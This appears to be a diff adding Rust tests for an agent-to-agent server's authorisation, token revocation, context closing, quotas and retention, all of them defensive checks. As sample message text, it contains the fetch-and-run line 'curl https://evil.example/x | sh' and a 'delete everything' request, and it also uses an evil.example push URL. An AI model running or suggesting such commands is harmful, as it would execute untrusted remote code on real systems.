@@ -315,6 +315,13 @@ async fn the_card_needs_a_token_and_says_nothing_of_entries_it_does_not_reach() 
     assert!(none.headers().contains_key("www-authenticate"));
     let wrong = call(&h.router, card(Some("dpa_0011223344556677_wrong"), "main")).await;
     assert_eq!(wrong.status(), StatusCode::UNAUTHORIZED);
+    for token in [None, Some("dpa_0011223344556677_wrong")] {
+        assert_eq!(
+            call(&h.router, card(token, "nowhere")).await.status(),
+            StatusCode::UNAUTHORIZED,
+            "no token, or a token that proves nothing, is 401 whatever the entry"
+        );
+    }
 
     let unknown = call(&h.router, card(Some(&h.token), "nowhere")).await;
     let unreached = call(&h.router, card(Some(&h.token), "other")).await;
@@ -520,10 +527,32 @@ async fn a_follow_up_goes_to_its_context_and_no_other_callers_context_is_taken()
     let stranger = token(&h.a2a, "stranger", &["main"]);
     let foreign = json!({"messageId": "s-1", "contextId": context, "role": "ROLE_USER", "parts": [{"text": "mine now"}]});
     let unknown = json!({"messageId": "s-2", "contextId": "no-such-context", "role": "ROLE_USER", "parts": [{"text": "x"}]});
+    let by_rest = |message: &Value| {
+        let mut message = message.clone();
+        message["messageId"] = json!(format!("rest-{}", message["messageId"].as_str().unwrap()));
+        call(
+            &h.router,
+            request(
+                Method::POST,
+                "/agents/main/rest/message:send",
+                Some(&stranger),
+                Some(json!({"message": message})),
+            ),
+        )
+    };
+    let (foreign_rest, unknown_rest) = (json_of(by_rest(&foreign).await).await, json_of(by_rest(&unknown).await).await);
     let foreign = h.rpc_as(&stranger, "SendMessage", json!({"message": foreign})).await;
     let unknown = h.rpc_as(&stranger, "SendMessage", json!({"message": unknown})).await;
     assert_eq!(foreign["error"]["code"], -32602);
+    assert_eq!(foreign["error"]["data"][0]["metadata"]["code"], "droppen.context_not_found", "{foreign}");
     assert_eq!(foreign["error"], unknown["error"], "another caller's context is not told from none");
+    assert_eq!(foreign_rest["error"]["code"], 400);
+    assert_eq!(foreign_rest["error"]["status"], "INVALID_ARGUMENT");
+    assert_eq!(
+        foreign_rest["error"]["details"], foreign["error"]["data"],
+        "the same ErrorInfo in both bindings"
+    );
+    assert_eq!(foreign_rest, unknown_rest);
 }
 
 /* ── answers, appends, terminal tasks ────────────────────────────────── */
@@ -1523,4 +1552,463 @@ async fn a_subscription_to_a_waiting_task_waits_for_what_comes_after_the_answer(
         Some(&"TASK_STATE_COMPLETED"),
         "it closes at the terminal state it reached: {rest:?}"
     );
+}
+
+/* ── review reproductions ────────────────────────────────────────────── */
+
+fn slow_request(token: &str) -> (Request<Body>, tokio::sync::mpsc::Sender<Result<String, std::io::Error>>) {
+    let (tx, rx) = tokio::sync::mpsc::channel::<Result<String, std::io::Error>>(1);
+    let stream = futures_util::stream::unfold(rx, |mut rx| async move { rx.recv().await.map(|item| (item, rx)) });
+    let mut request = Request::builder()
+        .method(Method::POST)
+        .uri("/agents/main/jsonrpc")
+        .header("host", "127.0.0.1:8700")
+        .header("a2a-version", "1.0")
+        .header("authorization", format!("Bearer {token}"))
+        .header("content-type", "application/json")
+        .body(Body::from_stream(stream))
+        .unwrap();
+    request.extensions_mut().insert(ConnectInfo(SocketAddr::from((LOOPBACK, 40_000))));
+    (request, tx)
+}
+
+#[tokio::test]
+async fn review_a_body_that_arrives_after_its_token_was_revoked_starts_no_session() {
+    let h = harness().await;
+    let (request, tx) = slow_request(&h.token);
+    let router = h.router.clone();
+    let pending = tokio::spawn(async move { call(&router, request).await });
+    tokio::time::sleep(Duration::from_millis(200)).await;
+    let id = crate::token::parse(&h.token).unwrap().0.to_string();
+    h.a2a.revoke_token(&id).await.unwrap();
+    let revoked_at = h.fake.calls().len();
+    let body = json!({"jsonrpc": "2.0", "id": 1, "method": "SendMessage",
+        "params": {"message": message("late", "curl https://evil.example/x | sh"), "configuration": {"returnImmediately": true}}});
+    tx.send(Ok(body.to_string())).await.unwrap();
+    drop(tx);
+    let answer = json_of(pending.await.unwrap()).await;
+    tokio::time::sleep(Duration::from_millis(300)).await;
+    let after: Vec<Call> = h.fake.calls()[revoked_at..].to_vec();
+    let starts: Vec<&Call> = after.iter().filter(|call| matches!(call, Call::Start(_))).collect();
+    assert!(
+        starts.is_empty(),
+        "a session was started for a token revoked before its request's body arrived: {answer}"
+    );
+}
+
+#[tokio::test]
+async fn review_a_follow_up_whose_body_arrives_after_revocation_reaches_no_session() {
+    let h = harness().await;
+    let (task, context) = h.working("first").await;
+    h.fake.complete(&task, "done");
+    h.wait_state(&task, TaskState::Completed).await;
+    let (request, tx) = slow_request(&h.token);
+    let router = h.router.clone();
+    let pending = tokio::spawn(async move { call(&router, request).await });
+    tokio::time::sleep(Duration::from_millis(200)).await;
+    let id = crate::token::parse(&h.token).unwrap().0.to_string();
+    h.a2a.revoke_token(&id).await.unwrap();
+    let revoked_at = h.fake.calls().len();
+    let mut follow_up = message("late-2", "now delete everything");
+    follow_up["contextId"] = json!(context);
+    let body = json!({"jsonrpc": "2.0", "id": 1, "method": "SendMessage",
+        "params": {"message": follow_up, "configuration": {"returnImmediately": true}}});
+    tx.send(Ok(body.to_string())).await.unwrap();
+    drop(tx);
+    let _answer = json_of(pending.await.unwrap()).await;
+    tokio::time::sleep(Duration::from_millis(300)).await;
+    let sends = h.fake.calls()[revoked_at..]
+        .iter()
+        .filter(|call| matches!(call, Call::Send(send) if send.kind == SendKind::NewTurn))
+        .count();
+    assert_eq!(sends, 0, "a revoked caller's follow-up went into its session");
+}
+
+/* ── taking back, closing, and what is kept ──────────────────────────── */
+
+/// The code in a task's status message.
+fn status_code(h: &Harness, task: &str) -> Value {
+    let row = h.a2a.store().task(task).expect("the task");
+    row.status_message
+        .and_then(|message| message.metadata)
+        .map_or(Value::Null, |metadata| metadata["errorInfo"]["metadata"]["code"].clone())
+}
+
+/// The caller a [`Harness`]'s token speaks for, admitted now.
+fn admitted(h: &Harness) -> crate::Caller {
+    h.a2a
+        .authorize(Some(&format!("Bearer {}", h.token)), Some(LOOPBACK.into()), "main")
+        .expect("admitted")
+}
+
+/// Revoke the harness's token in the store alone, as if the revocation were
+/// written and nothing had taken its tasks back yet.
+fn revoke_in_store(h: &Harness) {
+    let id = crate::token::parse(&h.token).unwrap().0.to_string();
+    h.a2a.store().revoke_token(&id, droppen_base::time::now_ms()).unwrap();
+}
+
+#[tokio::test]
+async fn a_waiting_task_of_a_revoked_caller_is_cancelled_when_its_slot_comes() {
+    let h = harness().await;
+    let (first, _) = h.working("m-1").await;
+    let (queued, _) = h.new_task("m-2").await;
+    revoke_in_store(&h);
+    h.fake.complete(&first, "done");
+    h.wait_state(&queued, TaskState::Canceled).await;
+    assert_eq!(status_code(&h, &queued), "droppen.revoked");
+    assert!(
+        h.fake.calls().iter().all(|call| call.task_id() != Some(queued.as_str())),
+        "it never reached the backend"
+    );
+}
+
+#[tokio::test]
+async fn an_answer_or_an_append_from_a_caller_revoked_meanwhile_reaches_no_session() {
+    let h = harness().await;
+    let who = admitted(&h);
+    let asking = h.asking("m-1").await;
+    let (working, _) = h.working("m-2").await;
+    revoke_in_store(&h);
+    let calls = h.fake.calls().len();
+    for (id, task, text) in [("a-1", &asking, "main"), ("a-2", &working, "and the docs")] {
+        let message = json!({"messageId": id, "taskId": task, "role": "ROLE_USER", "parts": [{"text": text}]});
+        let sent = h
+            .a2a
+            .send(&who, serde_json::from_value(json!({"message": message})).unwrap(), false)
+            .await;
+        let error = sent.err().expect("refused");
+        assert_eq!(error.code, Some(crate::backend::ErrorCode::Revoked), "{id}: {error}");
+        assert!(h.a2a.store().message_task(&who.caller, id).is_none(), "{id}: its claim is given back");
+    }
+    assert_eq!(h.fake.calls().len(), calls, "neither reached the backend");
+}
+
+#[tokio::test]
+async fn a_task_made_while_its_token_is_revoked_is_refused_or_taken_back() {
+    let h = harness().await;
+    let who = admitted(&h);
+    revoke_in_store(&h);
+    let sent = h
+        .a2a
+        .send(&who, serde_json::from_value(json!({"message": message("m-1", "x")})).unwrap(), false)
+        .await;
+    assert_eq!(sent.err().expect("refused").code, Some(crate::backend::ErrorCode::Revoked));
+    tokio::time::sleep(Duration::from_millis(50)).await;
+    assert!(
+        h.fake.calls().iter().all(|call| matches!(call, Call::CheckEntry(_))),
+        "nothing reached the backend"
+    );
+}
+
+#[tokio::test]
+async fn a_tightened_entry_closes_its_contexts_and_a_looser_change_does_not() {
+    let h = harness().await;
+    let (done, kept) = h.working("m-1").await;
+    h.fake.complete(&done, "done");
+    h.wait_state(&done, TaskState::Completed).await;
+    let follow_up = |id: &str, context: &str| {
+        json!({"message": {"messageId": id, "contextId": context, "role": "ROLE_USER", "parts": [{"text": "more"}]},
+            "configuration": {"returnImmediately": true}})
+    };
+
+    h.a2a
+        .update_entry(
+            "main",
+            serde_json::from_value(json!({"name": "Renamed", "model": "opus", "maxConcurrent": 2})).unwrap(),
+        )
+        .await
+        .unwrap();
+    let again = h.rpc("SendMessage", follow_up("m-2", &kept)).await;
+    let again = again["result"]["task"]["id"]
+        .as_str()
+        .unwrap_or_else(|| panic!("a name or a model leaves it open: {again}"))
+        .to_string();
+    h.fake.turn_started(&again);
+    h.wait_state(&again, TaskState::Working).await;
+
+    let (working, closing) = h.working("m-3").await;
+    let (queued, _) = h.new_task("m-4").await;
+    h.a2a
+        .update_entry("main", serde_json::from_value(json!({"cwd": "/elsewhere", "maxConcurrent": 1})).unwrap())
+        .await
+        .unwrap();
+    for task in [&again, &working, &queued] {
+        assert_eq!(h.state(task).await, TaskState::Canceled, "{task}");
+        assert_eq!(status_code(&h, task), "droppen.context_closed", "{task}");
+    }
+    let cancels = calls_of(&h.fake, |call| {
+        if let Call::Cancel(task) = call {
+            Some(task.task_id.clone())
+        } else {
+            None
+        }
+    });
+    assert_eq!(cancels, [again.clone(), working.clone()], "the running ones are interrupted");
+    for (id, context) in [("m-5", &kept), ("m-6", &closing)] {
+        let refused = h.rpc("SendMessage", follow_up(id, context)).await;
+        assert_eq!(refused["error"]["code"], -32004, "{refused}");
+        assert_eq!(refused["error"]["data"][1]["metadata"]["code"], "droppen.context_closed");
+    }
+    let (fresh, _) = h.new_task("m-7").await;
+    let Call::Start(start) = h.started(&fresh).await else { unreachable!() };
+    assert_eq!(start.run.cwd, "/elsewhere", "a new context runs as the entry now says");
+}
+
+#[tokio::test]
+async fn a_files_bytes_go_to_the_session_and_its_history_keeps_what_it_was() {
+    use base64::Engine as _;
+    let h = harness().await;
+    let bytes = vec![7u8; 1000];
+    let raw = base64::engine::general_purpose::STANDARD.encode(&bytes);
+    let parts = json!([{"text": "look"}, {"raw": raw, "mediaType": "image/png", "filename": "shot.png"}]);
+    let answer = h
+        .rpc(
+            "SendMessage",
+            json!({"message": {"messageId": "f-1", "role": "ROLE_USER", "parts": parts}, "configuration": {"returnImmediately": true}}),
+        )
+        .await;
+    let task = answer["result"]["task"]["id"].as_str().unwrap().to_string();
+    let Call::Start(start) = h.started(&task).await else { unreachable!() };
+    assert_eq!(start.prompt.images.len(), 1);
+    assert_eq!(start.prompt.images[0].bytes, bytes, "the session gets the file");
+    let got = h.rpc("GetTask", json!({"id": task})).await["result"].clone();
+    assert_eq!(
+        got["history"][0]["parts"][1],
+        json!({"data": {"kind": "omitted_file", "mediaType": "image/png", "size": 1000}, "mediaType": "application/json", "filename": "shot.png"}),
+        "the history keeps what it was, not its bytes"
+    );
+
+    let listed = h.rpc("ListTasks", json!({})).await["result"].clone();
+    assert!(
+        listed["tasks"][0].get("history").is_none(),
+        "a list carries no history unless asked: {listed}"
+    );
+    let asked = h.rpc("ListTasks", json!({"historyLength": 5})).await["result"].clone();
+    assert_eq!(asked["tasks"][0]["history"].as_array().unwrap().len(), 1);
+}
+
+#[tokio::test]
+async fn a_tasks_history_is_kept_under_a_megabyte_and_a_waiting_task_holds_no_more_than_it_may() {
+    let h = harness().await;
+    let (working, _) = h.working("m-1").await;
+    let text = "y".repeat(100_000);
+    for n in 0..12 {
+        let append = json!({"messageId": format!("a-{n}"), "taskId": working, "role": "ROLE_USER", "parts": [{"text": text}]});
+        let sent = h
+            .rpc("SendMessage", json!({"message": append, "configuration": {"returnImmediately": true}}))
+            .await;
+        assert!(sent["result"]["task"].is_object(), "{n}");
+    }
+    let history = h.a2a.store().task(&working).unwrap().history;
+    let size = serde_json::to_vec(&history).unwrap().len();
+    assert!(size <= 1024 * 1024, "{size} bytes kept");
+    assert_eq!(history.last().unwrap().message_id, "a-11", "the newest stays");
+    assert_ne!(history[0].message_id, "m-1", "the oldest went");
+
+    let (waiting, _) = h.new_task("w-0").await;
+    for n in 1..50 {
+        let append = json!({"messageId": format!("w-{n}"), "taskId": waiting, "role": "ROLE_USER", "parts": [{"text": "and"}]});
+        let sent = h
+            .rpc("SendMessage", json!({"message": append, "configuration": {"returnImmediately": true}}))
+            .await;
+        assert!(sent["result"]["task"].is_object(), "{n}: {sent}");
+    }
+    let append = json!({"messageId": "w-50", "taskId": waiting, "role": "ROLE_USER", "parts": [{"text": "and"}]});
+    let over = h
+        .rpc("SendMessage", json!({"message": append, "configuration": {"returnImmediately": true}}))
+        .await;
+    assert_eq!(over["error"]["data"][1]["metadata"]["code"], "droppen.quota_exceeded", "{over}");
+    assert_eq!(
+        h.a2a.store().task(&waiting).unwrap().history.len(),
+        50,
+        "none of its messages was dropped"
+    );
+}
+
+#[tokio::test]
+async fn what_finished_thirty_days_ago_is_forgotten_with_its_context() {
+    let h = harness().await;
+    let (done, context) = h.working("m-1").await;
+    h.fake.complete(&done, "done");
+    h.wait_state(&done, TaskState::Completed).await;
+    let (open, _) = h.new_task("m-2").await;
+    let now = droppen_base::time::now_ms();
+    assert_eq!(h.a2a.retain(now), 0, "nothing is that old yet");
+    assert_eq!(h.a2a.retain(now + 31 * 24 * 60 * 60 * 1000), 1);
+    assert!(h.a2a.store().task(&done).is_none());
+    assert!(h.a2a.store().events_after(&done, 0).is_empty(), "its events went with it");
+    assert!(h.a2a.store().context(&context).is_none(), "its context had no other task");
+    let caller = admitted(&h).caller;
+    assert!(h.a2a.store().message_task(&caller, "m-1").is_none(), "its message's key went with it");
+    assert!(h.a2a.store().task(&open).is_some(), "an unfinished task stays");
+}
+
+#[tokio::test]
+async fn a_push_url_outside_the_entrys_origins_refuses_the_request_with_its_code() {
+    let h = harness_with(json!({"pushOrigins": ["https://hooks.example.com"]})).await;
+    let push = json!({"url": "https://evil.example.com/x"});
+    let refused = h
+        .rpc(
+            "SendMessage",
+            json!({"message": message("p-1", "x"), "configuration": {"taskPushNotificationConfig": push, "returnImmediately": true}}),
+        )
+        .await;
+    assert_eq!(refused["error"]["code"], -32602);
+    assert_eq!(
+        refused["error"]["data"][0]["metadata"]["code"], "droppen.push_origin_not_allowed",
+        "{refused}"
+    );
+    let (task, _) = h.new_task("p-1").await;
+    let config = json!({"taskId": task, "url": "https://evil.example.com/x"});
+    let refused = h.rpc("CreateTaskPushNotificationConfig", config).await;
+    assert_eq!(refused["error"]["data"][0]["metadata"]["code"], "droppen.push_origin_not_allowed");
+}
+
+#[tokio::test]
+async fn a_follow_up_to_a_context_whose_session_never_started_starts_it() {
+    let h = harness().await;
+    let (busy, _) = h.working("b-1").await;
+    let (first, context) = h.new_task("m-1").await;
+    h.rpc("CancelTask", json!({"id": first})).await;
+    let follow_up = json!({"messageId": "m-2", "contextId": context, "role": "ROLE_USER", "parts": [{"text": "again"}]});
+    let second = h
+        .rpc("SendMessage", json!({"message": follow_up, "configuration": {"returnImmediately": true}}))
+        .await;
+    let second = second["result"]["task"]["id"].as_str().unwrap().to_string();
+    h.fake.complete(&busy, "done");
+    let Call::Start(start) = h.started(&second).await else { unreachable!() };
+    assert_eq!(start.task.context_id, context, "the follow-up starts its context's session");
+
+    h.fake.next_start(Err(BackendError::Rejected {
+        code: None,
+        message: "no".into(),
+    }));
+    let (rejected, context) = h.new_task("m-3").await;
+    h.fake.complete(&second, "done");
+    h.wait_state(&rejected, TaskState::Rejected).await;
+    let follow_up = json!({"messageId": "m-4", "contextId": context, "role": "ROLE_USER", "parts": [{"text": "again"}]});
+    let third = h
+        .rpc("SendMessage", json!({"message": follow_up, "configuration": {"returnImmediately": true}}))
+        .await;
+    let third = third["result"]["task"]["id"].as_str().unwrap().to_string();
+    h.started(&third).await;
+}
+
+#[tokio::test]
+async fn a_second_task_of_a_context_waits_while_its_session_is_started() {
+    let h = harness_with(json!({"maxConcurrent": 3})).await;
+    let gate = h.fake.hold_starts();
+    let (first, context) = h.new_task("m-1").await;
+    h.started(&first).await;
+    let follow_up = json!({"messageId": "m-2", "contextId": context, "role": "ROLE_USER", "parts": [{"text": "then this"}]});
+    let second = h
+        .rpc("SendMessage", json!({"message": follow_up, "configuration": {"returnImmediately": true}}))
+        .await;
+    let second = second["result"]["task"]["id"].as_str().unwrap().to_string();
+    let (other, _) = h.new_task("m-3").await;
+    h.started(&other).await;
+    tokio::time::sleep(Duration::from_millis(50)).await;
+    assert!(
+        h.fake.calls().iter().all(|call| call.task_id() != Some(second.as_str())),
+        "it waits for its context's session, and the other context's task went first"
+    );
+    gate.add_permits(2);
+    let id = second.clone();
+    let Call::Send(send) = h
+        .fake
+        .wait_for(move |call| matches!(call, Call::Send(send) if send.task.task_id == id))
+        .await
+    else {
+        unreachable!()
+    };
+    assert_eq!(send.kind, SendKind::NewTurn);
+    assert_eq!(
+        send.task.session.session_id.as_deref(),
+        Some("session-1"),
+        "into the session the first one started"
+    );
+}
+
+#[tokio::test]
+async fn a_caller_holds_at_most_sixteen_streams_open() {
+    let h = harness().await;
+    let (task, _) = h.working("m-1").await;
+    let mut streams = Vec::new();
+    for _ in 0..16 {
+        let mut stream = h.stream("SubscribeToTask", json!({"id": task})).await;
+        stream.next().await.unwrap();
+        streams.push(stream);
+    }
+    let over = h.rpc("SubscribeToTask", json!({"id": task})).await;
+    assert_eq!(over["error"]["data"][1]["metadata"]["code"], "droppen.quota_exceeded", "{over}");
+    let (status, over) = h.rest(Method::GET, &format!("tasks/{task}:subscribe"), None).await;
+    assert_eq!(status, StatusCode::BAD_REQUEST);
+    assert_eq!(over["error"]["details"][1]["metadata"]["code"], "droppen.quota_exceeded");
+    let over = h.rpc("SendStreamingMessage", json!({"message": message("m-2", "x")})).await;
+    assert_eq!(over["error"]["data"][1]["metadata"]["code"], "droppen.quota_exceeded");
+    assert!(h.a2a.store().message_task(&admitted(&h).caller, "m-2").is_none(), "and no task was made");
+
+    let other = token(&h.a2a, "other", &["main"]);
+    let body = json!({"jsonrpc": "2.0", "id": 9, "method": "SendStreamingMessage", "params": {"message": message("o-1", "x")}});
+    let response = call(&h.router, request(Method::POST, "/agents/main/jsonrpc", Some(&other), Some(body))).await;
+    assert!(
+        response.headers()["content-type"].to_str().unwrap().starts_with("text/event-stream"),
+        "another caller has streams of its own"
+    );
+
+    drop(streams.pop());
+    tokio::time::sleep(Duration::from_millis(50)).await;
+    let mut again = h.stream("SubscribeToTask", json!({"id": task})).await;
+    assert!(again.next().await.is_some(), "a closed stream gives its place back");
+}
+
+#[tokio::test(start_paused = true)]
+async fn a_body_that_does_not_arrive_in_a_minute_is_refused() {
+    let h = harness().await;
+    let (request, tx) = slow_request(&h.token);
+    let answer = json_of(call(&h.router, request).await).await;
+    assert_eq!(answer["error"]["code"], -32600, "{answer}");
+    drop(tx);
+}
+
+#[tokio::test]
+async fn the_open_contexts_are_listed_newest_first_a_page_at_a_time() {
+    use crate::manage::A2aContextQuery;
+    let h = harness_with(json!({"maxConcurrent": 8})).await;
+    let mut contexts = Vec::new();
+    for n in 0..3 {
+        let (task, context) = h.new_task(&format!("m-{n}")).await;
+        h.started(&task).await;
+        let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
+        while h.a2a.store().context(&context).unwrap().session.session_id.is_none() {
+            assert!(tokio::time::Instant::now() < deadline, "the session is never known");
+            tokio::time::sleep(Duration::from_millis(5)).await;
+        }
+        contexts.push(context);
+        tokio::time::sleep(Duration::from_millis(3)).await;
+    }
+    let page = |size: Option<u32>, token: Option<String>| {
+        h.a2a.context_list(&A2aContextQuery {
+            page_size: size,
+            page_token: token,
+        })
+    };
+    let first = page(Some(2), None).unwrap();
+    let ids: Vec<&str> = first.contexts.iter().map(|context| context.context_id.as_str()).collect();
+    assert_eq!(ids, [contexts[2].as_str(), contexts[1].as_str()]);
+    assert_eq!(first.contexts[0].caller_name.0.as_deref(), Some("dont-do"));
+    assert!(first.contexts[0].session_id.0.is_some(), "its session, once known");
+    let rest = page(Some(2), first.next_page_token.0.clone()).unwrap();
+    assert_eq!(rest.contexts.len(), 1);
+    assert_eq!(rest.contexts[0].context_id, contexts[0]);
+    assert_eq!(rest.next_page_token.0, None, "the last page");
+    assert!(page(Some(0), None).is_err());
+    assert!(page(None, Some("nonsense".into())).is_err());
+
+    h.a2a
+        .update_entry("main", serde_json::from_value(json!({"permission": "plan"})).unwrap())
+        .await
+        .unwrap();
+    assert!(page(None, None).unwrap().contexts.is_empty(), "a closed context is not open");
 }
